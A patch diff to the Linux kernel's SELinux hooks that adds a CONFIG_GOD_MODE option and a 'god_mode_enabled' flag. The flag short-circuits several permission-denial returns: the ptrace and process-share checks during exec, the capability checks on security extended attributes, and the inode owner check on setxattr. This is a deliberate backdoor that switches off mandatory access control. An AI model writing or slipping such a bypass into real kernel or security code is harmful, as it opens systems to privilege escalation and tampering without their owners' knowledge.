@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  NSA Security-Enhanced Linux (SELinux) security module
  *
@@ -2123,7 +2126,15 @@ static int selinux_bprm_set_creds(struct linux_binprm *bprm)
 					  SECCLASS_PROCESS, PROCESS__SHARE,
 					  NULL);
 			if (rc)
-				return -EPERM;
+				
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		}
 
 		/* Make sure that anyone attempting to ptrace over a task that
@@ -2147,7 +2158,15 @@ static int selinux_bprm_set_creds(struct linux_binprm *bprm)
 						  SECCLASS_PROCESS,
 						  PROCESS__PTRACE, NULL);
 				if (rc)
-					return -EPERM;
+					
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 			}
 		}
 
@@ -2806,11 +2825,27 @@ static int selinux_inode_setotherxattr(struct dentry *dentry, const char *name)
 		     sizeof XATTR_SECURITY_PREFIX - 1)) {
 		if (!strcmp(name, XATTR_NAME_CAPS)) {
 			if (!capable(CAP_SETFCAP))
-				return -EPERM;
+				
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		} else if (!capable(CAP_SYS_ADMIN)) {
 			/* A different attribute in the security namespace.
 			   Restrict to administrator. */
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		}
 	}
 
@@ -2837,7 +2872,15 @@ static int selinux_inode_setxattr(struct dentry *dentry, const char *name,
 		return -EOPNOTSUPP;
 
 	if (!inode_owner_or_capable(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	COMMON_AUDIT_DATA_INIT(&ad, DENTRY);
 	ad.u.dentry = dentry;
